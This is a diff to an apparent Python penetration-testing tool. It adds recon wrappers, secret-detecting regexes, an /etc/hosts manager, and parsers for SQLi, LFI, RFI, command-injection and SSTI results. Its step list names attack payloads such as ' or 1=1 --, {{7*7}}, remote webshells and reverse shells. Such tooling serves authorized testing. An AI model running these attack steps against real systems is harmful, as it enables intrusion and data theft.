@@ -17,7 +17,9 @@ explicitly permitted to test.
 
 from __future__ import annotations
 
+import atexit
 import ipaddress
+import json
 import os
 import re
 import shlex
@@ -1013,7 +1015,9 @@ def _extract_hostnames(ip: str, sid: str, output: str) -> set:
     cands = []
     if "ssl-cert" in sid or "ssl-" in sid:
         cands += re.findall(r"DNS:([A-Za-z0-9_.*-]+)", output)
-        cands += re.findall(r"commonName=([A-Za-z0-9_.*-]+)", output)
+        cands += re.findall(r"(?:commonName|CN)=([A-Za-z0-9_.*-]+)", output)
+    if sid == "vhost-fuzz":                       # our sweep marks hits with "  + <host>"
+        cands += re.findall(r"^\s*\+ ([A-Za-z0-9_.-]+)", output, re.M)
     if sid.startswith("http-"):
         cands += re.findall(r"redirect to https?://([A-Za-z0-9_.-]+)", output, re.I)
         cands += re.findall(r"[Ll]ocation:\s*https?://([A-Za-z0-9_.-]+)", output)
@@ -1045,12 +1049,145 @@ def save_hostnames(ip: str, entries: list) -> None:
             conn.commit()
         finally:
             conn.close()
+    _sync_hosts_block(ip)             # keep the managed /etc/hosts block current (root only)
 
 
 def fetch_hostnames(ip: str) -> list:
     """(hostname, port, source) DNS names discovered for a host, for phase-5 vhost work."""
     rows = _fetch("SELECT hostname, port, source FROM hostnames WHERE ip = ? ORDER BY hostname", (ip,))
     return rows
+
+
+# ── managed /etc/hosts block ──────────────────────────────────────────────────
+# Discovered vhosts are useless in a browser / name-based tools until they resolve, and
+# the only OS-wide way to do that is /etc/hosts (glibc reads it hard-coded; no alternate
+# file, no include). So — WHEN RUNNING AS ROOT — we maintain one marked block per target
+# IP, rebuilt from the DB. The block is treated as EPHEMERAL session state: it is stripped
+# on startup (surviving a crash / SIGKILL / terminal close, unlike an exit-only hook — the
+# same reasoning as _chown_db_to_user) and best-effort removed again at exit. Without root
+# we never touch the file; the user gets a paste-ready line instead.
+HOSTS_PATH = "/etc/hosts"
+_HOSTS_LOCK = threading.Lock()
+_HOSTS_LEDGER = os.path.join(os.path.dirname(DB_PATH), "hosts_ledger.json")
+_HOSTS_BLOCK_RE = re.compile(
+    r"\n?# >>> pshunter (?P<ip>\S+) >>>\n.*?\n# <<< pshunter (?P=ip) <<<\n?", re.S)
+
+
+def _read_hosts() -> str:
+    with open(HOSTS_PATH, encoding="utf-8", errors="replace") as fh:
+        return fh.read()
+
+
+def _write_hosts(text: str) -> None:
+    """Atomically replace /etc/hosts (temp in the same dir → os.replace). Needs root."""
+    d = os.path.dirname(HOSTS_PATH) or "/"
+    fd, tmp = tempfile.mkstemp(prefix=".pshunter-hosts-", dir=d)
+    try:
+        with os.fdopen(fd, "w", encoding="utf-8") as fh:
+            fh.write(text)
+        os.replace(tmp, HOSTS_PATH)
+    except BaseException:
+        try:
+            os.unlink(tmp)
+        except OSError:
+            pass
+        raise
+
+
+def _strip_pshunter_blocks(text: str, ip: "str | None" = None) -> str:
+    """Remove our marked block(s) — one IP's, or all of them if ip is None."""
+    if ip is None:
+        return _HOSTS_BLOCK_RE.sub("\n", text)
+    pat = re.compile(
+        rf"\n?# >>> pshunter {re.escape(ip)} >>>\n.*?\n# <<< pshunter {re.escape(ip)} <<<\n?", re.S)
+    return pat.sub("\n", text)
+
+
+def _ledger_load() -> list:
+    try:
+        with open(_HOSTS_LEDGER, encoding="utf-8") as fh:
+            data = json.load(fh)
+        return data if isinstance(data, list) else []
+    except (OSError, ValueError):
+        return []
+
+
+def _ledger_save(ips: list) -> None:
+    try:
+        with open(_HOSTS_LEDGER, "w", encoding="utf-8") as fh:
+            json.dump(sorted(set(ips)), fh)
+    except OSError:
+        pass
+
+
+def _hosts_snippet(ip: str) -> "str | None":
+    """A ready-to-paste one-liner adding all of an IP's discovered names in one go."""
+    names = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
+    if not names:
+        return None
+    return f"sudo sh -c 'echo \"{ip}  {' '.join(names)}\" >> /etc/hosts'"
+
+
+def _sync_hosts_block(ip: str) -> None:
+    """Rebuild the managed /etc/hosts block for one IP from the DB. Root only; silent
+    no-op otherwise (the launch notice / findings snippet tell the user what to do)."""
+    if not ip or _is_self_ip(ip) or not _is_root():
+        return
+    names = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
+    with _HOSTS_LOCK:
+        try:
+            text = _read_hosts()
+        except OSError:
+            return
+        new = _strip_pshunter_blocks(text, ip)
+        if names:
+            if not new.endswith("\n"):
+                new += "\n"
+            new += (f"# >>> pshunter {ip} >>>\n{ip}  {' '.join(names)}\n"
+                    f"# <<< pshunter {ip} <<<\n")
+        if new != text:
+            try:
+                _write_hosts(new)
+            except OSError:
+                return
+        led = _ledger_load()
+        if names and ip not in led:
+            _ledger_save(led + [ip])
+        elif not names and ip in led:
+            _ledger_save([x for x in led if x != ip])
+
+
+def _remove_all_pshunter_hosts() -> None:
+    """Strip every managed block — used for startup reconciliation and the atexit hook."""
+    if not _is_root():
+        return
+    with _HOSTS_LOCK:
+        try:
+            text = _read_hosts()
+        except OSError:
+            return
+        new = _strip_pshunter_blocks(text)
+        if new != text:
+            try:
+                _write_hosts(new)
+            except OSError:
+                pass
+    _ledger_save([])
+
+
+def _reconcile_hosts_on_start() -> None:
+    """Clear any residue from a previous (possibly crashed) session. As root we strip it;
+    without root we can't write the file, so we just point out the leftovers + the fix."""
+    if _is_root():
+        _remove_all_pshunter_hosts()
+        return
+    try:
+        text = _read_hosts()
+    except OSError:
+        return
+    if "# >>> pshunter " in text:
+        print(f"{YELLOW}⚠ leftover pshunter /etc/hosts entries from a previous session{RESET} "
+              f"{DIM}— clean with: sudo sed -i '/# >>> pshunter/,/# <<< pshunter/d' /etc/hosts{RESET}")
 
 
 def save_os(ip: str, os_name: str) -> None:
@@ -1582,6 +1719,273 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": " · ".join(parts)[:140]}
         return None
 
+    # 2c) whatweb stack fingerprint: fold server / framework / CMS + versions into a finding
+    if sid == "http-fingerprint":
+        interesting = {
+            "apache", "nginx", "microsoft-iis", "litespeed", "openresty", "tomcat", "jetty",
+            "php", "asp.net", "x-powered-by", "python", "ruby", "django", "express", "laravel",
+            "nodejs", "node.js", "wordpress", "drupal", "joomla", "magento", "mediawiki",
+            "typo3", "moodle", "jenkins", "jira", "gitlab", "phpmyadmin",
+        }
+        tech, seen = [], set()
+        for name, val in re.findall(r"([A-Za-z0-9_.-]+)\[([^\]]*)\]", output):
+            if name.lower() not in interesting:
+                continue
+            val = val.strip()
+            item = f"{name} {val}" if val else name
+            if item.lower() not in seen:
+                seen.add(item.lower())
+                tech.append(item)
+        if tech:
+            return {"state": "INFO", "cve": cve, "risk": "INFO",
+                    "summary": ("stack: " + ", ".join(tech))[:140]}
+        return None
+
+    # 2d) TLS cert (openssl / nmap ssl-cert): surface emails + self-signed note. SAN/CN
+    #     hostnames go to the hostnames table via _extract_hostnames, not here.
+    if sid == "ssl-cert":
+        emails = sorted(set(re.findall(r"[\w.+-]+@[\w-]+\.[\w.-]+", output)))
+        selfsigned = bool(re.search(r"self[- ]signed", output, re.I))
+        parts = []
+        if emails:
+            parts.append("emails: " + ", ".join(emails))
+        if selfsigned:
+            parts.append("self-signed cert")
+        if parts:
+            return {"state": "INFO", "cve": cve, "risk": "LOW" if selfsigned else "INFO",
+                    "summary": " · ".join(parts)[:140]}
+        return None
+
+    # 2e) searchsploit: fold Exploit-DB candidate matches into one finding (leads, not proof)
+    if sid == "searchsploit":
+        titles = re.findall(r"^\[.*?\]\s*(.+?)\s*\(EDB-(\d+)\)", output, re.M)
+        if not titles:
+            return None
+        items = [f"{t} (EDB-{e})" for t, e in titles]
+        return {"state": "INFO", "cve": cve, "risk": "MEDIUM",
+                "summary": ("exploits: " + "; ".join(items))[:140]}
+
+    # 2f) http-source: fold mined secrets / endpoints / comments counts into one finding
+    if sid == "http-source":
+        def _count(sec):
+            mm = re.search(rf"{sec} \((\d+)\)", output)
+            return int(mm.group(1)) if mm else 0
+        nsec, neps, ncom = _count("POTENTIAL SECRETS"), _count("ENDPOINTS"), _count("HTML COMMENTS")
+        if not (nsec or neps or ncom):
+            return None
+        parts = []
+        if nsec:
+            labels = sorted(set(re.findall(r"^  ([a-z-]+):",
+                            output[output.find("POTENTIAL SECRETS"):], re.M)))
+            parts.append("secrets: " + (", ".join(labels) if labels else str(nsec)))
+        if neps:
+            parts.append(f"endpoints: {neps}")
+        if ncom:
+            parts.append(f"comments: {ncom}")
+        return {"state": "INFO", "cve": cve, "risk": "MEDIUM" if nsec else "INFO",
+                "summary": (" · ".join(parts))[:140]}
+
+    # 2g) http-wellknown: fold robots/sitemap hidden paths + error-page tech leak into a finding
+    if sid == "http-wellknown":
+        def _c(sec):
+            mm = re.search(rf"{sec} \((\d+)\)", output)
+            return int(mm.group(1)) if mm else 0
+        nrob, nsm, nwk = _c("ROBOTS PATHS"), _c("SITEMAP URLS"), _c("WELL-KNOWN")
+        techm = re.search(r"^ERROR-PAGE TECH:\s*(.+)$", output, re.M)
+        tech = techm.group(1).strip() if techm else ""
+        if not (nrob or nsm or nwk or tech):
+            return None
+        parts = []
+        if nrob:
+            parts.append(f"robots: {nrob} paths")
+        if nsm:
+            parts.append(f"sitemap: {nsm} urls")
+        if nwk:
+            parts.append(f"well-known: {nwk}")
+        if tech:
+            parts.append("errorpage: " + tech)
+        return {"state": "INFO", "cve": cve, "risk": "LOW" if (nrob or tech) else "INFO",
+                "summary": (" · ".join(parts))[:140]}
+
+    # 2h) http-cookies: JWT compromise (alg:none / weak secret) or missing cookie flags
+    if sid == "http-cookies":
+        jwt_hi = re.findall(r"⚠ (alg:none[^\n]*|weak HS256 secret: '[^']+')", output)
+        gaps = re.findall(r"^  ([^:]+): missing ([A-Za-z,]+)", output, re.M)
+        parts = []
+        if jwt_hi:
+            parts.append("JWT: " + "; ".join(jwt_hi))
+        if gaps:
+            parts.append("cookies: " + ", ".join(f"{n} missing {m}" for n, m in gaps[:4]))
+        if not parts:
+            return None
+        sensitive = any(("Secure" in m or "HttpOnly" in m) for _n, m in gaps)
+        risk = "HIGH" if jwt_hi else ("MEDIUM" if sensitive else "LOW")
+        return {"state": "EXPOSED" if jwt_hi else "INFO", "cve": cve, "risk": risk,
+                "summary": (" · ".join(parts))[:140]}
+
+    # 2i) vhost-fuzz: virtual hosts discovered on this IP (each may hold its own app/vuln)
+    if sid == "vhost-fuzz":
+        vhosts = re.findall(r"^  \+ ([A-Za-z0-9_.-]+)", output, re.M)
+        if not vhosts:
+            return None
+        shown = ", ".join(vhosts[:6]) + (f" +{len(vhosts) - 6} more" if len(vhosts) > 6 else "")
+        return {"state": "INFO", "cve": cve, "risk": "LOW",
+                "summary": f"vhosts: {shown} ({len(vhosts)})"[:140]}
+
+    # 2j) dir-brute: discovered paths/files; elevate when something sensitive turns up
+    if sid == "dir-brute":
+        hits = re.findall(r"^\s*\+ (\d{3})\s+(\S+)", output, re.M)
+        if not hits:
+            return None
+        shown = ", ".join(f"{p} ({s})" for s, p in hits[:6]) + \
+            (f" +{len(hits) - 6} more" if len(hits) > 6 else "")
+        sensitive = any(_DIRB_SENSITIVE.search(p) for _s, p in hits)
+        return {"state": "INFO", "cve": cve, "risk": "MEDIUM" if sensitive else "LOW",
+                "summary": f"paths: {shown} ({len(hits)})"[:140]}
+
+    # 2k) vcs-hunt: exposed VCS / backups / secrets — high when source/creds/data can leak
+    if sid == "vcs-hunt":
+        hits = re.findall(r"^\s*[!+] \d{3}\s+(\S+)", output, re.M)
+        if not hits:
+            return None
+        shown = ", ".join(hits[:6]) + (f" +{len(hits) - 6} more" if len(hits) > 6 else "")
+        high = any(_VCS_HIGH_RE.search(p) for p in hits)
+        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH" if high else "MEDIUM",
+                "summary": f"exposed: {shown} ({len(hits)})"[:140]}
+
+    # 2l) param-hunt: hidden GET params; MEDIUM when a param name implies injection surface
+    if sid == "param-hunt":
+        groups = re.findall(r"^\s+(\S+?)\?\[([^\]]+)\]", output, re.M)
+        if not groups:
+            return None
+        params = {p.strip() for _e, ps in groups for p in ps.split(",") if p.strip()}
+        shown = "; ".join(f"{e}?[{ps}]" for e, ps in groups[:4]) + (" …" if len(groups) > 4 else "")
+        danger = params & _PARAM_DANGEROUS
+        summ = f"params: {shown} ({len(params)})"
+        if danger:
+            summ += " · risky: " + ",".join(sorted(danger)[:6])
+        return {"state": "INFO", "cve": cve, "risk": "MEDIUM" if danger else "LOW",
+                "summary": summ[:140]}
+
+    # 2m) default-creds: working default logins = immediate foothold → high
+    if sid == "default-creds":
+        hits = re.findall(r"^\s*! (\S+) @ (\S+) \((\w+)\)", output, re.M)
+        if not hits:
+            return None
+        shown = "; ".join(f"{c} @ {p}" for c, p, _t in hits[:4]) + (" …" if len(hits) > 4 else "")
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"default creds: {shown} ({len(hits)})"[:140]}
+
+    # 2n) auth-bypass: SQLi login bypass (highest) → DB error → user enumeration
+    if sid == "auth-bypass":
+        byp = re.findall(r"BYPASS (\S+)", output)
+        err = re.findall(r"SQLERROR (\S+)", output)
+        enum = re.findall(r"ENUM (\S+)", output)
+        if byp:
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"SQLi auth bypass: {', '.join(byp[:3])} ({len(byp)})"[:140]}
+        if err:
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"SQLi login (DB error): {', '.join(err[:3])} ({len(err)})"[:140]}
+        if enum:
+            return {"state": "INFO", "cve": cve, "risk": "MEDIUM",
+                    "summary": f"user enumeration: {', '.join(enum[:3])} ({len(enum)})"[:140]}
+        return None
+
+    # 2o) login-brute: cracked creds (foothold) → high; lockout gate tripped → info
+    if sid == "login-brute":
+        cracked = re.findall(r"CRACKED (\S+) @ (\S+)", output)
+        lock = re.findall(r"LOCKOUT (\S+)", output)
+        if cracked:
+            shown = "; ".join(f"{c} @ {p}" for c, p in cracked[:3]) + (" …" if len(cracked) > 3 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"brute-forced: {shown} ({len(cracked)})"[:140]}
+        if lock:
+            return {"state": "INFO", "cve": cve, "risk": "LOW",
+                    "summary": f"brute skipped — lockout: {', '.join(lock[:3])}"[:140]}
+        return None
+
+    # 2p) sqli-scan: injectable params (error/boolean/time) → sqlmap enum/dump
+    if sid == "sqli-scan":
+        pts = re.findall(r"✗ SQLI (\S+)", output)
+        if not pts:
+            return None
+        dumped = "; dumped" if re.search(r"dumped: yes", output) else ""
+        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"SQLi: {shown} ({len(pts)}){dumped}"[:140]}
+
+    # 2q) sqli-dump: OSCP-safe extraction — real data pulled = confirmed + looted
+    if sid == "sqli-dump":
+        pts = re.findall(r"✗ (\S+)", output)
+        if not pts:
+            return None
+        db = re.search(r"db: (\S+)", output)
+        looted = "; rows dumped" if re.search(r"^\s{8}\S", output, re.M) else ""
+        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
+        extra = (f"; db {db.group(1)}" if db else "") + looted
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"SQLi dump: {shown} ({len(pts)}){extra}"[:140]}
+
+    # 2r) lfi-scan: local file read confirmed by content signature → high
+    if sid == "lfi-scan":
+        pts = re.findall(r"✗ LFI (\S+)", output)
+        if not pts:
+            return None
+        caps = []
+        if "/etc/passwd via" in output:
+            caps.append("/etc/passwd")
+        if "php://filter source readable" in output:
+            caps.append("source")
+        if "/proc/self/environ readable" in output:
+            caps.append("environ")
+        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
+        tail = (" · " + "+".join(caps)) if caps else ""
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"LFI: {shown} ({len(pts)}){tail}"[:140]}
+
+    # 2s) rfi-scan: wrapper inclusion with code execution (marker echoed) → RCE
+    if sid == "rfi-scan":
+        execs = re.findall(r"✗ RFI (\S+)", output)
+        if not execs:
+            return None
+        shown = ", ".join(execs[:4]) + (f" +{len(execs) - 4}" if len(execs) > 4 else "")
+        vtail = "; rev-shell verified" if "egress VERIFIED" in output else ""
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"RFI RCE (wrapper): {shown} ({len(execs)}){vtail}"[:140]}
+
+    # 2t) cmdi-scan: OS command injection (computed-marker or time) → RCE
+    if sid == "cmdi-scan":
+        pts = re.findall(r"✗ CMDI (\S+)", output)
+        if not pts:
+            return None
+        mu = re.search(r"^\s+id: (uid=\S+)", output, re.M)
+        shown = ", ".join(pts[:4]) + (f" +{len(pts) - 4}" if len(pts) > 4 else "")
+        tail = f" · {mu.group(1)}" if mu else ""
+        if "egress VERIFIED" in output:
+            tail += " · rev-shell verified"
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"OS cmd injection: {shown} ({len(pts)}){tail}"[:140]}
+
+    # 2u) ssti-scan: template injection — RCE-confirmed (id) high, eval-only medium
+    if sid == "ssti-scan":
+        rce = re.findall(r"✗ SSTI (\S+)", output)
+        eval_only = re.findall(r"⚠ SSTI (\S+)", output)
+        if rce:
+            eng = re.search(r"→ (\w+), RCE confirmed", output)
+            uid = re.search(r"id: (uid=\S+)", output)
+            shown = ", ".join(rce[:4]) + (f" +{len(rce) - 4}" if len(rce) > 4 else "")
+            tail = (f"; {eng.group(1)}" if eng else "") + (f"; {uid.group(1)}" if uid else "")
+            if "egress VERIFIED" in output:
+                tail += "; rev-shell verified"
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"SSTI RCE: {shown} ({len(rce)}){tail}"[:140]}
+        if eval_only:
+            shown = ", ".join(eval_only[:4]) + (f" +{len(eval_only) - 4}" if len(eval_only) > 4 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "MEDIUM",
+                    "summary": f"SSTI (eval, RCE unconfirmed): {shown} ({len(eval_only)})"[:140]}
+        return None
+
     # 3) info rules over -sC output
     low = output.lower()
     info = None
@@ -1593,8 +1997,6 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
         info = ("risky HTTP methods enabled", "LOW")
     elif sid in ("http-title", "http-ls") and "index of /" in low:
         info = ("directory listing enabled", "LOW")
-    elif sid == "ssl-cert" and ("self-signed" in low or "self signed" in low):
-        info = ("self-signed TLS certificate", "LOW")
     elif sid == "ssl-enum-ciphers" and re.search(r"least strength:\s*[C-F]", output):
         info = ("weak TLS ciphers", "MEDIUM")
     elif sid in ("smb-security-mode", "smb2-security-mode") and "not required" in low:
@@ -2013,6 +2415,7 @@ def _render_host_progress(ip: str) -> None:
 def _launch_phase_for(key: str, ip: str) -> None:
     """Run one workflow phase for a host chosen in the progress view — same launch path
     as the per-phase handlers, but the IP is already known so it's not re-typed."""
+    _sync_hosts_block(ip)     # running any command on a host materialises its DB domains → hosts (root)
     if key == "0":
         print(f"{DIM}note: host discovery scans a subnet/range, not one host — use "
               f"{BOLD}[0]{RESET}{DIM} from the menu{RESET}")
@@ -2170,28 +2573,48 @@ _EXPLOIT_STEPS = {
     "http": [
         # ── fingerprint & recon ──
         ("HTTP headers, status & redirects (Server, X-Powered-By, cookies)", "http-headers"),
-        "Fingerprint stack: whatweb / Wappalyzer / favicon hash → server, framework, CMS, versions",
-        "TLS cert & redirects → extra hostnames / vhosts / emails; add them to /etc/hosts",
-        "searchsploit the exact server / CMS / app versions (note every version you see)",
+        ("Fingerprint stack: whatweb / Wappalyzer / favicon hash → server, framework, CMS, versions",
+         "http-fingerprint"),
+        ("TLS cert & redirects → extra hostnames / vhosts / emails; add them to /etc/hosts",
+         "ssl-cert"),
+        ("searchsploit the exact server / CMS / app versions (note every version you see)",
+         "searchsploit"),
         # ── manual inspection ──
-        "View-source + linked JS on every page → comments, endpoints, API routes, creds/keys",
-        "robots.txt / sitemap.xml / .well-known + error pages → hidden paths & tech leaks",
-        "Cookies & session: flags, predictable IDs; decode JWT, test alg:none / weak secret",
+        ("View-source + linked JS on every page → comments, endpoints, API routes, creds/keys",
+         "http-source"),
+        ("robots.txt / sitemap.xml / .well-known + error pages → hidden paths & tech leaks",
+         "http-wellknown"),
+        ("Cookies & session: flags, predictable IDs; decode JWT, test alg:none / weak secret",
+         "http-cookies"),
         # ── content discovery ──
-        "Directory & file brute-force (feroxbuster / ffuf / gobuster) — ext php,asp,aspx,txt,bak,zip",
-        "Hunt exposed VCS / backups / config: .git .svn .env web.config *.bak *~ config.php",
-        "Vhost & subdomain fuzzing (ffuf -H 'Host:') — hidden apps often hold the vuln",
-        "Hidden parameter discovery (arjun / ffuf) on dynamic endpoints",
+        ("Vhost & subdomain fuzzing (ffuf -H 'Host:') — map every app on this IP; hidden apps often hold the vuln",
+         "vhost-fuzz"),
+        ("Directory & file brute-force (feroxbuster / ffuf / gobuster) on the default host and every discovered vhost — ext php,asp,aspx,txt,bak,zip",
+         "dir-brute"),
+        ("Hunt exposed VCS / backups / config: .git .svn .env web.config *.bak *~ config.php",
+         "vcs-hunt"),
+        ("Hidden parameter discovery (arjun / ffuf) on dynamic endpoints",
+         "param-hunt"),
         # ── authentication ──
-        "Default / weak creds on every login and admin panel (admin:admin, product defaults)",
-        "Auth bypass & user enumeration (SQLi ' or 1=1 --, verbose errors, response timing)",
-        "Targeted brute-force (hydra) only if enumeration confirms users and no lockout",
+        ("Default / weak creds on every login and admin panel (admin:admin, product defaults)",
+         "default-creds"),
+        ("Auth bypass & user enumeration (SQLi ' or 1=1 --, verbose errors, response timing)",
+         "auth-bypass"),
+        ("Targeted brute-force (hydra) only if enumeration confirms users and no lockout",
+         "login-brute"),
         # ── injection & inclusion (OSCP core) ──
-        "SQLi → auth bypass, UNION/error/blind dump; escalate to file read & RCE (xp_cmdshell / INTO OUTFILE / stacked)",
-        "LFI / path traversal (/etc/passwd, web.config) → RCE via log poisoning, php://filter, /proc/self/environ",
-        "RFI → include a remote webshell (allow_url_include)",
-        "OS command injection (; | & ` $()) in every input → reverse shell",
-        "SSTI ({{7*7}} / ${7*7}) → RCE (Jinja2 / Twig / Freemarker)",
+        ("SQLi auto-dump (OSCP-safe, no sqlmap): UNION/error extract → DB, tables, rows; blind for short values",
+         "sqli-dump"),
+        ("SQLi → auth bypass, UNION/error/blind dump; escalate to file read & RCE (xp_cmdshell / INTO OUTFILE / stacked; sqlmap)",
+         "sqli-scan"),
+        ("LFI / path traversal (/etc/passwd, web.config) → RCE via log poisoning, php://filter, /proc/self/environ",
+         "lfi-scan"),
+        ("RFI → include a remote webshell (allow_url_include)",
+         "rfi-scan"),
+        ("OS command injection (; | & ` $()) in every input → reverse shell",
+         "cmdi-scan"),
+        ("SSTI ({{7*7}} / ${7*7}) → RCE (Jinja2 / Twig / Freemarker)",
+         "ssti-scan"),
         "File upload → webshell: bypass extension/MIME/magic (.phtml, double ext, null byte)",
         "XXE (XML input) & SSRF (reach internal services / 169.254.169.254 metadata)",
         "IDOR / broken access control — tamper IDs & roles to reach admin / other users",
@@ -2664,10 +3087,3243 @@ def _tool_http_headers(ip: str, port: int, proto: str) -> str:
     return "\n".join(lines)
 
 
+def _tool_http_fingerprint(ip: str, port: int, proto: str) -> str:
+    """HTTP step-2 tool: fingerprint the web stack with whatweb (server, framework, CMS,
+    plugins, versions) — deeper than step 1's raw headers. External binary; a missing
+    whatweb or a dead target raises, so the step won't turn green on a non-result."""
+    exe = shutil.which("whatweb")
+    if not exe:
+        raise RuntimeError("whatweb not found in PATH — install it or run this step manually")
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    url = f"{'https' if tls else 'http'}://{ip}:{port}/"
+    proc = subprocess.run([exe, "--color=never", "--no-errors", "-a", "1", url],
+                          capture_output=True, text=True, timeout=90)
+    out = (proc.stdout or "").strip() or (proc.stderr or "").strip()
+    if not out:
+        raise RuntimeError("whatweb returned no output (target unreachable?)")
+    return out
+
+
+def _tool_tls_cert(ip: str, port: int, proto: str) -> str:
+    """HTTP step-3 tool: grab the TLS certificate with openssl and dump its text (subject,
+    issuer, SAN). Saved under the 'ssl-cert' id so _extract_hostnames auto-harvests SAN DNS
+    names into the hostnames table (→ /etc/hosts / vhost-fuzz); emails land in findings.
+    Non-TLS ports raise, so the step won't turn green on a non-result."""
+    exe = shutil.which("openssl")
+    if not exe:
+        raise RuntimeError("openssl not found in PATH — run this step manually")
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    if not tls:
+        raise RuntimeError(f"no TLS on {ip}:{port} — step 3 targets HTTPS/TLS services")
+    cmd = [exe, "s_client", "-connect", f"{ip}:{port}"]
+    hn = next((h for h, _p, _s in fetch_hostnames(ip)), None)   # SNI → per-vhost cert if we have a name
+    if hn:
+        cmd += ["-servername", hn]
+    s = subprocess.run(cmd, input="", capture_output=True, text=True, timeout=20)
+    if "BEGIN CERTIFICATE" not in s.stdout:
+        raise RuntimeError("no certificate returned (handshake failed?)")
+    x = subprocess.run([exe, "x509", "-noout", "-text"], input=s.stdout,
+                       capture_output=True, text=True, timeout=15)
+    out = (x.stdout or "").strip()
+    if not out:
+        raise RuntimeError("could not parse certificate")
+    return out
+
+
+_SPLOIT_INTERESTING = {   # whatweb plugin names worth an Exploit-DB lookup (when versioned)
+    "apache", "nginx", "microsoft-iis", "litespeed", "openresty", "tomcat", "jetty",
+    "php", "wordpress", "drupal", "joomla", "magento", "mediawiki", "typo3", "moodle",
+    "jenkins", "jira", "gitlab", "phpmyadmin", "openssl", "openssh",
+}
+
+
+def _exploit_search_terms(ip: str, port: int, proto: str) -> list:
+    """(product, version) pairs to feed searchsploit: nmap -sV product+version plus the
+    whatweb CMS/framework tokens from step 2. Only pairs with a real version number (x.y[.z])
+    — bare products are skipped because they'd flood searchsploit."""
+    terms, seen = [], set()
+
+    def _add(product: str, version: str) -> None:
+        product, version = (product or "").strip(), (version or "").strip()
+        if not product or not re.match(r"\d+(\.\d+)+", version):   # need major.minor at least
+            return
+        product = product.split()[0].lower()          # "Apache httpd" -> "apache"
+        version = re.match(r"[0-9.]+", version).group(0)   # "2.4.29 (Ubuntu)" -> "2.4.29"
+        if (product, version) not in seen:
+            seen.add((product, version))
+            terms.append((product, version))
+
+    _name, prod, ver, _cpe = (fetch_services(ip).get((port, proto)) or ("", "", "", ""))
+    _add(prod, ver)                                    # 1) nmap -sV
+    for sid, out in fetch_scripts(ip, port, proto):    # 2) whatweb fingerprint tokens
+        if sid != "http-fingerprint":
+            continue
+        for pname, pval in re.findall(r"([A-Za-z0-9_.-]+)\[([^\]]*)\]", out or ""):
+            if pname.lower() in _SPLOIT_INTERESTING:
+                _add(pname, pval)
+    return terms
+
+
+def _tool_searchsploit(ip: str, port: int, proto: str) -> str:
+    """HTTP step-4 tool: query the local Exploit-DB for the versions found in steps 1-2 with
+    searchsploit --strict --title (version-range fuzzing off → far fewer false positives).
+    Candidates only — verify before use; CMS matches can still hit plugin versions."""
+    exe = shutil.which("searchsploit")
+    if not exe:
+        raise RuntimeError("searchsploit not found in PATH — install exploitdb or run manually")
+    terms = _exploit_search_terms(ip, port, proto)
+    if not terms:
+        raise RuntimeError("no product+version known yet — run steps 1-2 first")
+    searched = "; ".join(f"{p} {v}" for p, v in terms)
+    seen, hits = set(), []
+    for product, version in terms:
+        proc = subprocess.run([exe, "-j", "-s", "-t", product, version],
+                              capture_output=True, text=True, timeout=30)
+        try:
+            rows = json.loads(proc.stdout or "{}").get("RESULTS_EXPLOIT", [])
+        except ValueError:
+            rows = []
+        for r in rows:
+            edb = str(r.get("EDB-ID", "?"))
+            if edb in seen:
+                continue
+            seen.add(edb)
+            hits.append((f"{product} {version}", (r.get("Title") or "").strip(), edb,
+                         r.get("Path", "")))
+            if len(hits) >= 10:                        # cap: keep it a shortlist, not a dump
+                break
+        if len(hits) >= 10:
+            break
+    if not hits:
+        return f"searched: {searched}\n\nno Exploit-DB matches (strict/version)"
+    lines = [f"searched: {searched}", ""]
+    for term, title, edb, path in hits:
+        lines.append(f"[{term}] {title}  (EDB-{edb})")
+        if path:
+            lines.append(f"    {path}")
+    return "\n".join(lines)
+
+
+_SECRET_PATTERNS = [   # conservative set — fixed-format keys first, then noisier assignments
+    ("aws-key",     r"AKIA[0-9A-Z]{16}"),
+    ("google-api",  r"AIza[0-9A-Za-z_\-]{35}"),
+    ("slack-token", r"xox[baprs]-[0-9A-Za-z-]{10,}"),
+    ("jwt",         r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}"),
+    ("bearer",      r"[Aa]uthorization[\"']?\s*[:=]\s*[\"']?Bearer\s+[A-Za-z0-9._\-]+"),
+    ("private-key", r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"),
+    ("assignment",  r"(?i)(?:api[_-]?key|secret|token|password|passwd|pwd)"
+                    r"[\"']?\s*[:=]\s*[\"'][^\"']{6,60}[\"']"),
+]
+
+
+def _tool_http_source(ip: str, port: int, proto: str) -> str:
+    """HTTP step-5 tool: fetch the landing page + its same-host JS (depth 0-1) and mine HTML
+    comments, endpoints / API routes and likely secrets (keys, tokens). Stdlib only; a dead
+    target raises so the step won't go green. Secrets are candidates — verify (esp. assignment)."""
+    import urllib.request
+    import urllib.error
+    import urllib.parse
+    import ssl
+
